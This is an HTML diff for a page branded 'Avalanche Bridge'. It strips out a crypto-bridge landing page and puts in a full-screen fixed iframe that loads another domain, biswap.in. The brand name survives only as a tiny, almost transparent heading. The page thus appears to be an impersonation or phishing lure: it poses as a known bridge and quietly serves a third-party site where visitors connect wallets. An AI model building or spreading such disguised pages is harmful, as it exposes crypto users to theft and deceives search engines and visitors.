@@ -159,165 +159,19 @@
   @media (prefers-reduced-motion:reduce){*{animation-duration:.01ms!important; transition-duration:.01ms!important}}
   </style>
 </head>
-<body>
-  <div class="bg" aria-hidden="true"><div class="glow"></div><div class="hatch"></div></div>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <header class="topbar">
-    <a class="brand" href="./">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Avalanche Bridge</span>
-    </a>
-    <span class="spacer"></span>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="how-it-works/">How it works</a>
-      <a href="faq/">FAQ</a>
-      <a href="about/">About</a>
-      <a href="security/">Security</a>
-      <a href="supported-chains/">Supported Chains</a>
-    </nav>
-  </header>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-  <main>
-    <section class="wrap hero">
-      <span class="eyebrow"><span class="dot"></span>Cross-Chain Bridge</span>
-      <h1>Avalanche Bridge</h1>
-      <p class="deck">Avalanche Bridge moves assets between Ethereum and Avalanche from a <strong>non-custodial</strong> flow built for clear routes, wallet control, and confident review before every signature.</p>
-      <div class="cta-row">
-        <a class="primary" href="dashboard/">Open App
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-        </a>
-        <a class="ghost" href="how-it-works/">How it works
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
-        </a>
-      </div>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Avalanche Bridge
+  </h1>
 
-      <section class="routebar" aria-label="Bridge preview">
-        <div class="rhead">
-          <span class="ct">Bridge</span>
-          <span class="pill"><span class="pdot"></span>Preview</span>
-        </div>
-        <div class="rgrid">
-          <div class="leg">
-            <span class="lab">From</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="eth.png" alt="ETH">ETH <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Amount in app</span>
-            </div>
-          </div>
-          <button class="rswitch" type="button" data-switch aria-label="Switch direction">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4v13M4 14l3 3 3-3M17 20V7M14 10l3-3 3 3"/></svg>
-          </button>
-          <div class="leg">
-            <span class="lab">To</span>
-            <div class="legrow">
-              <button class="tok" type="button"><img src="avax.png" alt="AVAX">AVAX <span class="cv" aria-hidden="true">&#9662;</span></button>
-              <span class="gv">Live quote in app</span>
-            </div>
-          </div>
-        </div>
-        <div class="rbar-foot">
-          <div class="rmeta">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm0 5v5l3 3"/></svg>
-            Route, network cost, and timing are shown in the app before you sign.
-          </div>
-          <a class="rcta" href="dashboard/">Open App
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg>
-          </a>
-        </div>
-        <p class="rnote">Preview only &middot; non-custodial &middot; connect your wallet in the app</p>
-      </section>
-    </section>
-
-    <!-- WHY (icon-left rows) -->
-    <section class="wrap sec" id="why">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6l8-4z"/></svg>Why bridge here</span>
-        <h2 class="h2">Avalanche Bridge for wallet-native moves</h2>
-        <p>Bridge into the Avalanche ecosystem without handing funds to a hosted account. The app keeps the decision points visible: source chain, destination chain, asset, route, estimated completion window, network cost, and the final wallet prompt.</p>
-      </div>
-      <div class="rows">
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></span>
-          <div><h3>Non-custodial from start to finish</h3><p>Use the <a class="cite" href="https://core.app/bridge/" rel="nofollow noopener noreferrer">official bridge screen</a> style of wallet-first flow: connect, review, and sign from your wallet instead of depositing assets into an exchange account.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/></svg></span>
-          <div><h3>Built around Ethereum and Avalanche</h3><p>Move supported assets from <a class="cite" href="https://ethereum.org/" rel="nofollow noopener noreferrer">Ethereum mainnet</a> toward Avalanche C-Chain access, then use AVAX for activity across the <a class="cite" href="https://www.avax.network/" rel="nofollow noopener noreferrer">network overview</a> and DeFi apps.</p></div>
-        </div>
-        <div class="frow2">
-          <span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9 9 0 0 1 9 9 9 9 0 0 1-9 9"/><path d="M3 12h6l2-3 2 6 2-3h2"/></svg></span>
-          <div><h3>Route details before confirmation</h3><p>Cost, route, and time estimates can change with chain conditions, so Avalanche Bridge keeps the live quote inside the app and asks you to check the wallet request before broadcasting.</p></div>
-        </div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="how">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 12h16M4 17h10"/></svg>How it works</span>
-        <h2 class="h2">Bridge to Avalanche in three steps</h2>
-        <p>The flow is direct: choose the route, approve the transaction, and track the transfer until the destination chain is ready for use.</p>
-      </div>
-      <div class="steps">
-        <div class="step"><span class="num">1</span><h3>Connect your wallet</h3><p>Open the app and connect a Web3 wallet such as <a class="cite" href="https://metamask.io/" rel="nofollow noopener noreferrer">MetaMask wallet software</a>. Your private keys stay with you.</p></div>
-        <div class="step"><span class="num">2</span><h3>Choose ETH to AVAX</h3><p>Select the source chain, destination chain, and asset. The preview shows amount entry in the app, destination token, route details, and live quote.</p></div>
-        <div class="step"><span class="num">3</span><h3>Review and confirm</h3><p>Check destination address, route, time, and cost, then sign only if the wallet prompt matches what you expect.</p></div>
-      </div>
-    </section>
-
-    <!-- FAQ (2-col) -->
-    <section class="wrap sec" id="faq">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.8.4-1 .8-1 1.7M12 17h.01"/></svg>FAQ</span>
-        <h2 class="h2">Avalanche Bridge questions</h2>
-      </div>
-      <div class="faq">
-        <div class="qa"><span class="qn">01</span><h3>What is Avalanche Bridge?</h3><p>Avalanche Bridge is a non-custodial DeFi app flow for moving supported crypto assets between Ethereum and Avalanche so you can use funds on Avalanche C-Chain without a centralized deposit step.</p></div>
-        <div class="qa"><span class="qn">02</span><h3>Which assets and chains are supported?</h3><p>The core route is Ethereum to Avalanche, with supported assets shown in the app at quote time. For the broader list, use the <a href="supported-chains/">supported chains</a> page.</p></div>
-        <div class="qa"><span class="qn">03</span><h3>How long does a bridge transfer take?</h3><p>Timing depends on the selected route, source-chain confirmation, and destination-chain conditions. The live estimate belongs inside the app, where it can update before you sign.</p></div>
-        <div class="qa"><span class="qn">04</span><h3>What does Avalanche Bridge cost?</h3><p>Bridge cost depends on network fees, routing, and the asset selected. The app shows the live cost before confirmation, and your wallet shows the final transaction request.</p></div>
-        <div class="qa"><span class="qn">05</span><h3>Is Avalanche Bridge non-custodial?</h3><p>Yes. You connect your wallet, keep control of your keys, and approve each transaction yourself. After submission, you can inspect Avalanche-side activity with a <a class="cite" href="https://snowtrace.io/" rel="nofollow noopener noreferrer">C-Chain block explorer</a>.</p></div>
-        <div class="qa"><span class="qn">06</span><h3>What should I check before signing?</h3><p>Confirm the destination address, network names, token symbol, amount, route, and wallet permission. If you need to verify network settings, use a trusted <a class="cite" href="https://chainlist.org/" rel="nofollow noopener noreferrer">EVM network registry</a>.</p></div>
-      </div>
-    </section>
-
-    <section class="wrap sec" id="more">
-      <div class="sec-head">
-        <span class="eyebrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7 0l2-2a5 5 0 0 0-7-7l-1 1M14 11a5 5 0 0 0-7 0l-2 2a5 5 0 0 0 7 7l1-1"/></svg>Learn more</span>
-        <h2 class="h2">Explore Avalanche Bridge</h2>
-      </div>
-      <div class="related">
-        <a class="rel" href="how-it-works/"><span class="rt">How it works <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The full walkthrough for choosing a bridge route, reviewing the quote, and confirming from your wallet.</p></a>
-        <a class="rel" href="security/"><span class="rt">Security <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>How self-custody, wallet prompts, and route review help you bridge with better control.</p></a>
-        <a class="rel" href="supported-chains/"><span class="rt">Supported chains <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17 17 7M9 7h8v8"/></svg></span><p>The networks and assets available for Avalanche Bridge routes inside the app.</p></a>
-      </div>
-    </section>
-  </main>
-
-  <footer class="footer">
-    <div class="wrap">
-      
-      <p style="margin-top:6px"><b>Avalanche Bridge</b></p>
-    </div>
-  </footer>
-
-  <script type="application/ld+json">
-  {"@context":"https://schema.org","@graph":[
-    {"@type":"WebSite","@id":"https://avalanche-bridge.github.io/#website","url":"https://avalanche-bridge.github.io/","name":"Avalanche Bridge"},
-    {"@type":"Organization","@id":"https://avalanche-bridge.github.io/#org","name":"Avalanche Bridge","url":"https://avalanche-bridge.github.io/","logo":"https://avalanche-bridge.github.io/favicon.png"},
-    {"@type":"WebApplication","name":"Avalanche Bridge","applicationCategory":"FinanceApplication","operatingSystem":"Web","url":"https://avalanche-bridge.github.io/","browserRequirements":"Requires a Web3 wallet","description":"Non-custodial DeFi app for bridging supported crypto assets between Ethereum and Avalanche from a wallet-native interface."},
-    {"@type":"FAQPage","mainEntity":[
-      {"@type":"Question","name":"What is Avalanche Bridge?","acceptedAnswer":{"@type":"Answer","text":"Avalanche Bridge is a non-custodial DeFi app flow for moving supported crypto assets between Ethereum and Avalanche so you can use funds on Avalanche C-Chain without a centralized deposit step."}},
-      {"@type":"Question","name":"Which assets and chains are supported?","acceptedAnswer":{"@type":"Answer","text":"The core route is Ethereum to Avalanche, with supported assets shown in the app at quote time. For the broader list, use the supported chains page."}},
-      {"@type":"Question","name":"How long does a bridge transfer take?","acceptedAnswer":{"@type":"Answer","text":"Timing depends on the selected route, source-chain confirmation, and destination-chain conditions. The live estimate belongs inside the app, where it can update before you sign."}},
-      {"@type":"Question","name":"What does Avalanche Bridge cost?","acceptedAnswer":{"@type":"Answer","text":"Bridge cost depends on network fees, routing, and the asset selected. The app shows the live cost before confirmation, and your wallet shows the final transaction request."}},
-      {"@type":"Question","name":"Is Avalanche Bridge non-custodial?","acceptedAnswer":{"@type":"Answer","text":"Yes. You connect your wallet, keep control of your keys, and approve each transaction yourself. After submission, you can inspect Avalanche-side activity with a C-Chain block explorer."}},
-      {"@type":"Question","name":"What should I check before signing?","acceptedAnswer":{"@type":"Answer","text":"Confirm the destination address, network names, token symbol, amount, route, and wallet permission. If you need to verify network settings, use a trusted EVM network registry."}}
-    ]}
-  ]}
-  </script>
-
-  <script>
-  (function(){"use strict";var b=document.querySelector("[data-switch]");if(!b)return;b.addEventListener("click",function(){var p=document.querySelectorAll(".rgrid .tok");if(p.length<2)return;var t=p[0].innerHTML;p[0].innerHTML=p[1].innerHTML;p[1].innerHTML=t;});}());
-  </script>
 </body>
 </html>
